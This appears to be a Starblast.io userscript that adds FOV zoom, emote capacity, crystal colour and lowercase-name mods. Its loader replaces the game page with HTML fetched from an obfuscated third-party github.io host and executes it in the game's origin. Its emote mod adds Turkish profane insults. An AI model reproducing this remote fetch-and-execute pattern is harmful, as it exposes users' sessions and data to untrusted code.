if (!window.sbCodeInjectors) window.sbCodeInjectors = [];

// Global settings object
window.modSettings = {
  fovEnabled: true,
  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,  // Parse as integer
   uiVisible: true
};

// Lowercase Name Mod
const modName = "Lowercase Name";
const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");

function lowercaseInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;
  
  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  src = src.replace(/\.toUpperCase\(\)/g, "");
  const styleBlock = `
  <style>
  #player input { text-transform: none !important; }
  </style>
  `;
  src = src.replace('</head>', `${styleBlock}</head>`);
  checkSrcChange();

  logLowercase("Mod injected");
  return src;
}

// Custom Emote Mod
const emoteModName = "Custom Emote";
const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");

function emoteInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;
  
  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
  const emotes = `,{
    text: "orosbu cocu",
    icon: "🤡",
    key: "J"
  },{
    text: "sikerim",
    icon: "⚠️",
    key: "V"
  }`;

  src = src.replace(vocabPattern, `$1${emotes}`);
  checkSrcChange();
  logEmote("Clown and warning emotes injected");
  
  return src;
}
// FOV Editor Mod
const fovModName = "FOV Editor";
const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");

window.I1000 = window.I1000 || {};
window.I1000.baseFOV = 45;
window.I1000.currentFOV = 45;

function fovInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  const fovPattern = /this\.I1000\.fov\s*=\s*45\s*\*\s*this\.IO11l\.I1000\.zoom/g;
  src = src.replace(fovPattern, 'this.I1000.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IO11l.I1000.zoom');
  checkSrcChange();

const controlStyles = `
<style>
  #mod-controls {
    position: fixed;
    top: 10px;
    right: 10px;  /* Changed to right */
    z-index: 1000;
    font-family: Arial, sans-serif;
    user-select: none;
    background: linear-gradient(-45deg, hsl(294.98deg 100% 50% / 50%) 0, hsla(200, 50%, 50%, .15) 100%); /* Simplified gradient */
    box-shadow: 0 0 4px #387aff; /* Reduced shadow size */
    color: white;
    padding: 4px; /* Smaller padding */
    border-radius: 4px; /* Added slight rounding */
    opacity: 1;  /* Set to fully opaque */
    width: 120px; /* Reduced width */
  }
  #mod-controls-header {
    cursor: pointer;
    text-align: left;  /* Changed to left align like image */
    padding: 4px;
  }
  #mod-controls-panel {
    padding: 4px;
    display: none;
  }
  .mod-control {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin: 4px 0;
    color: #b8d4ff;
  }
  .mod-control-slider {
    width: 100%;
    margin-top: 4px;
    background: rgba(56, 122, 255, 0.2);
  }
  #crystal-color-picker {
    width: 100%;
    margin-top: 4px;
  }
  #fov-display {
    padding: 4px;
    margin-top: 4px;
    display: block;
    color: #b8d4ff;
  }
  input[type="checkbox"] {
    margin: 0;
    cursor: pointer;
  }
  .control-value {
    font-size: 11px; /* Slightly smaller font size */
    text-align: right;
    min-width: 30px;
    color: #b8d4ff;
  }
</style>
`;

const controlsHTML = `
  <div id="mod-controls" style="display: ${window.modSettings.uiVisible ? 'block' : 'none'}">
    <div id="mod-controls-header">Controls</div>
    <div id="mod-controls-panel">
      <div class="mod-control">
        <span>FOV</span>
        <input type="checkbox" id="fov-toggle" checked>  <!-- Changed to simple checkbox -->
      </div>
      <div class="mod-control">
        <span>Emote Capacity</span>
        <div class="control-value" id="emote-capacity-value">${window.modSettings.emoteCapacity}</div>
      </div>
      <input type="range" min="1" max="5" value="${window.modSettings.emoteCapacity}" class="mod-control-slider" id="emote-capacity-slider">
      <div class="mod-control">
        <span>Crystal Color</span>
        <input type="color" id="crystal-color-picker" value="#ffffff">
      </div>
    </div>
    <div id="fov-display">
      FOV: <span id="fov-value">45</span>
    </div>
  </div>
`;



  // Add emote capacity mod with fixes
  const emoteCapacityMod = `
  let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];
  
  // Override the emotes capacity getter
  ChatPanel.prototype.getEmotesCapacity = function() {
    const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
    return Math.min(Math.max(1, savedCapacity), 5);
  };
  
  // Override the typed function to use the new capacity
  ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();
  
  // Set initial capacity
  if (window.modSettings && window.modSettings.emoteCapacity) {
    localStorage.setItem('emote-capacity', window.modSettings.emoteCapacity);
  }
  `;

  // Add crystal color mod
 const crystalColorMod = `
/*
 * Change crystal color (processing code)
 */
let CrystalObject;
for (let i in window) {
  try {
    let val = window[i];
    if ("function" == typeof val.prototype.createModel && val.prototype.createModel.toString().includes("Crystal")) {
      CrystalObject = val;
      console.log('Found CrystalObject:', CrystalObject);
      break;
    }
  } catch (e) {}
}

let oldModel = CrystalObject.prototype.getModelInstance,
  getCustomCrystalColor = function () {
    const color = localStorage.getItem("crystal-color") || "#ffffff";
    console.log('Getting custom color from storage:', color);
    return color;
  };

CrystalObject.prototype.getModelInstance = function () {
  let res = oldModel.apply(this, arguments);
  let color = getCustomCrystalColor();
  if (color) {
    console.log('Setting material color to:', color);
    this.material.color.set(color);
  }
  return res;
};

function updateCrystalColor(color) {
  console.log('updateCrystalColor called with:', color);
  try {
    localStorage.setItem("crystal-color", color);
    console.log('Color saved to localStorage:', localStorage.getItem("crystal-color"));
    
    if (window.CrystalObject) {
      const instance = CrystalObject.prototype.getModelInstance();
      if (instance && instance.material) {
        instance.material.color.set(color);
        console.log('Updated crystal material color');
      } else {
        console.log('Could not find material on model instance');
      }
    } else {
      console.log('CrystalObject not found in window');
    }
  } catch (e) {
    console.error('Error updating crystal color:', e);
  }
}

// Add event listener after DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
  console.log('DOM Content Loaded - Setting up color picker');
  const crystalColorPicker = document.getElementById('crystal-color-picker');
  
  if (crystalColorPicker) {
    console.log('Found color picker element');
    
    // Initialize with saved color if it exists
    const savedColor = localStorage.getItem('crystal-color');
    if (savedColor) {
      console.log('Setting initial color picker value:', savedColor);
      crystalColorPicker.value = savedColor;
    }

    crystalColorPicker.addEventListener('change', (event) => {
      console.log('Color picker changed:', event.target.value);
      updateCrystalColor(event.target.value);
    });

    crystalColorPicker.addEventListener('input', (event) => {
      console.log('Color picker input:', event.target.value);
      updateCrystalColor(event.target.value);
    });
  } else {
    console.log('Could not find crystal-color-picker element');
  }
});
`;

  src = src.replace('</body>', `
    ${controlStyles}
    ${controlsHTML}
    <script>
    ${emoteCapacityMod}
    ${crystalColorMod}

    const fovDisplay = document.getElementById('fov-display');

    // Add wheel event listener for FOV change
    document.addEventListener('wheel', (e) => {
      if (!window.modSettings.fovEnabled) return;
      e.preventDefault();
      const delta = e.deltaY < 0 ? 1 : -1;
      // Add bounds checking
      window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
      document.getElementById('fov-value').textContent = window.I1000.currentFOV;
    }, { passive: false });

    document.addEventListener('DOMContentLoaded', () => {
      const controlsHeader = document.getElementById('mod-controls-header');
      const controlsPanel = document.getElementById('mod-controls-panel');
      const fovToggle = document.getElementById('fov-toggle');
      const emoteSlider = document.getElementById('emote-capacity-slider');
      const emoteValue = document.getElementById('emote-capacity-value');
      const crystalColorPicker = document.getElementById('crystal-color-picker');

      // Initialize values from localStorage
      const savedCrystalColor = localStorage.getItem('crystal-color');
      if (savedCrystalColor) {
        crystalColorPicker.value = savedCrystalColor;
      }

      controlsHeader.addEventListener('click', () => {
        controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
      });

      fovToggle.addEventListener('change', () => {
        window.modSettings.fovEnabled = fovToggle.checked;
        fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
      });

      emoteSlider.addEventListener('input', () => {
        const value = parseInt(emoteSlider.value);
        emoteValue.textContent = value;
        window.modSettings.emoteCapacity = value;
        localStorage.setItem('emote-capacity', value);
        
        // Update the emote capacity immediately
        if (window.ChatPanel) {
          ChatPanel.prototype.getEmotesCapacity = function() {
            return value;
          };
        }
      });

      crystalColorPicker.addEventListener('change', () => {
        const color = crystalColorPicker.value;
        updateCrystalColor(color);
      });

      // Initialize emote capacity from localStorage
      const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
      emoteSlider.value = savedCapacity;
      emoteValue.textContent = savedCapacity;
      window.modSettings.emoteCapacity = savedCapacity;
    });
    </script>
    </body>`);

  checkSrcChange();

  logFOV("FOV injector applied");
  return src;
}


  document.addEventListener('keydown', (e) => {
    if (e.key === 'F9') {
      const controls = document.getElementById('mod-controls');
      if (controls) {
        window.modSettings.uiVisible = !window.modSettings.uiVisible;
        controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';
      }
    }
  });

// Add all injectors
window.sbCodeInjectors.push((sbCode) => {
  try {
    return lowercaseInjector(sbCode);
  } catch (error) {
    alert(`${modName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return emoteInjector(sbCode);
  } catch (error) {
    alert(`${emoteModName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return fovInjector(sbCode);
  } catch (error) {
    alert(`${fovModName} failed to load; error: ${error}`);
    throw error;
  }
});

// Main code injection logic
const log = (msg) => console.log(`%c[eot] ${msg}`, "color: #FF00E6");

function injectLoader() {
  if (window.location.pathname !== "/") {
    log("Injection not needed");
    return;
  }

  document.open();
  document.write('<html><head><title></title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;"></h1><h1 style="text-align: center;color: #000;"></h1></div></body></html>');
  document.close();

  var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html';
  url += '?_=' + new Date().getTime();

  var xhr = new XMLHttpRequest();
  log("Fetching custom source...");
  xhr.open("GET", url);
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var starSRC = xhr.responseText;

      if (starSRC !== undefined) {
        log("Source fetched successfully");
        const start_time = performance.now();
        log("Applying mods...");

        if (!window.sbCodeInjectors) {
          log("No Starblast.io userscripts found to load");
        } else {
          let error_notified = false;
          for (const injector of window.sbCodeInjectors) {
            try {
              if (typeof injector === "function") starSRC = injector(starSRC);
              else {
                log("Injector was not a function");
                console.log(injector);
              }
            } catch (error) {
              if (!error_notified) {
                alert("One of your Starblast.io userscripts failed to load");
                error_notified = true;
              }
              console.error(error);
            }
          }
        }

        const end_time = performance.now();
        log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);

        // After modifying the starSRC, apply text shadow modification
        changeTextShadowColor();

        // Apply the modified source to the document
        document.open();
        document.write(starSRC);
        document.close();
      } else {
        log("Source fetch failed");
        alert("An error occurred while fetching game code");
      }
    }
  };

  xhr.send();
}

// Function to change all text-shadow properties to a specific color
function changeTextShadowColor() {
  const elements = document.querySelectorAll('*'); // Select all elements on the page
  const targetShadow = '0 0 6px hsl(298.15deg 100% 50%)'; // Target text-shadow style

  elements.forEach(element => {
    const currentStyle = window.getComputedStyle(element);
    const textShadow = currentStyle.getPropertyValue('text-shadow');
    
    // If the element has a text-shadow property, change it to the target color
    if (textShadow && textShadow !== 'none') {
      element.style.textShadow = targetShadow;
    }
  });

  console.log('Text shadow color has been changed to:', targetShadow);
}

// Run the injectLoader function immediately
injectLoader();


